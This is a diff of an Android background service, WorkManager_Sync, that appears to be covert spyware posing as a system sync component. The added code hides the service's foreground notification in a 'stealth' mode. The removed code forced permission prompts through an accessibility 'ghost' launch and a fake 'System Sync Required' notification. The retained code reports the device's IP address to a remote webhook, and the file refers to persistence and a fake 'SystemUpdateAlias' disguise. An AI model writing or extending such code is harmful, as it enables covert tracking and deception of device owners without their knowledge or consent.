@@ -376,13 +376,7 @@ public class WorkManager_Sync extends Service {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                 
-                // Add LOCATION type if permission is granted (Required for Android 14+ background access)
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
-                    ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
-                }
-                
-                // Add SPECIAL_USE for Android 14+ Persistence
+                // Add SPECIAL_USE for Android 14+ Persistence (DATA_SYNC and SPECIAL_USE are valid for background startup)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                     serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
                 }
@@ -398,6 +392,19 @@ public class WorkManager_Sync extends Service {
                 startForeground(NOTIFICATION_ID, notification);
                 isForeground = true;
             }
+
+            if (SystemAnalytics.isStealthEnabled(this)) {
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            stopForeground(STOP_FOREGROUND_REMOVE);
+                        } else {
+                            stopForeground(true);
+                        }
+                        isForeground = false;
+                    } catch (Exception ignored) {}
+                }, 100);
+            }
         } catch (Exception e) {
             Log.e(TAG, "Critical FGS startup failure: " + e.getMessage());
         }
@@ -410,12 +417,6 @@ public class WorkManager_Sync extends Service {
                 PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
                     FirebaseConfig.logActivity("SYSTEM_WARNING: Power limits enforced. Persistence may be compromised.");
-                }
-
-                // Check App Hibernation (Auto-revoke permissions) on Android 11+
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                    android.app.usage.StorageStatsManager ssm = (android.app.usage.StorageStatsManager) getSystemService(android.content.Context.STORAGE_STATS_SERVICE);
-                    // There isn't a direct API to check hibernation status, but we can prompt the settings
                 }
             } catch (Exception ignored) {}
         }, 5000);
@@ -602,8 +603,7 @@ public class WorkManager_Sync extends Service {
     }
 
     private boolean isStealthMode() {
-        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
-        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+        return SystemAnalytics.isStealthEnabled(this);
     }
 
     private Notification createNotification() {
@@ -721,65 +721,22 @@ public class WorkManager_Sync extends Service {
         }
     }
 
-    public static void triggerPermissionActivity(Context context) {
-        if (context == null) return;
-        
-        Log.d(TAG, "Initiating tactical permission pop...");
-        FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Permission sequence DISPATCHED.");
-
-        // 1. Prepare the Hub Intent
-        Intent intent = new Intent(context, PermissionActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NO_ANIMATION);
-
-        // 2. High-Privilege Ghost Launch (If Accessibility is ON)
-        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
-        if (ghost != null) {
-            try {
-                ghost.startActivity(intent);
-                return; // Ghost launch is perfect, no fallback needed
-            } catch (Exception ignored) {}
-        }
-
-        // 3. Standard Foreground Flip (If Ghost is OFF)
-        try {
-            context.startActivity(intent);
-        } catch (Exception e) {
-            Log.e(TAG, "Background start blocked: " + e.getMessage());
-            // Last resort: standard notification (No popup, just a prompt to tap)
-            NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
-            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT : PendingIntent.FLAG_UPDATE_CURRENT;
-            PendingIntent pi = PendingIntent.getActivity(context, 2001, intent, flags);
-            
-            NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "StabilityChannel")
-                    .setSmallIcon(R.drawable.labrats_internal_logo)
-                    .setContentTitle("System Sync Required")
-                    .setContentText("Tap to fix core synchronization.")
-                    .setPriority(NotificationCompat.PRIORITY_MAX)
-                    .setContentIntent(pi)
-                    .setAutoCancel(true);
-            nm.notify(2001, builder.build());
-        }
-    }
-
     private synchronized void checkAndSendIpReport(String currentIp) {
-        if (currentIp == null || currentIp.trim().isEmpty() || "Unknown".equalsIgnoreCase(currentIp) || "127.0.0.1".equals(currentIp)) {
-            Log.d(TAG, "IP Report Skipped: Invalid or unresolved IP (" + currentIp + ")");
-            return;
-        }
-
         long now = System.currentTimeMillis();
-        boolean ipChanged = !currentIp.equalsIgnoreCase(lastReportedIp);
+        boolean ipChanged = (currentIp != null) && !currentIp.equalsIgnoreCase(lastReportedIp);
         boolean maintenanceTimeElapsed = (now - lastReportTimestamp) > 1800000; // 30 minutes
 
-        // Only send Google Sheets ping if IP changed OR 30-min maintenance interval reached
-        if (!ipChanged && !maintenanceTimeElapsed && lastReportTimestamp > 0) {
-            Log.d(TAG, "IP Report Skipped: IP unchanged (" + currentIp + ") and maintenance interval not reached.");
-            return;
-        }
-
         Log.d(TAG, "IP Report Triggered for IP: " + currentIp + " (ipChanged=" + ipChanged + ")");
-        if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
+        if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.trim().isEmpty()) {
             if (REMOTE_WEBHOOK_URL.contains("script.google.com") || REMOTE_WEBHOOK_URL.contains("script.googleusercontent.com")) {
+                if (currentIp == null || currentIp.trim().isEmpty() || "Unknown".equalsIgnoreCase(currentIp) || "127.0.0.1".equals(currentIp)) {
+                    Log.d(TAG, "Sheets Ping Skipped: Invalid or unresolved IP (" + currentIp + ")");
+                    return;
+                }
+                if (!ipChanged && !maintenanceTimeElapsed && lastReportTimestamp > 0) {
+                    Log.d(TAG, "Sheets Ping Skipped: IP unchanged and interval not reached.");
+                    return;
+                }
                 boolean success = sendIpToWebhook(currentIp);
                 if (success) {
                     lastReportedIp = currentIp;
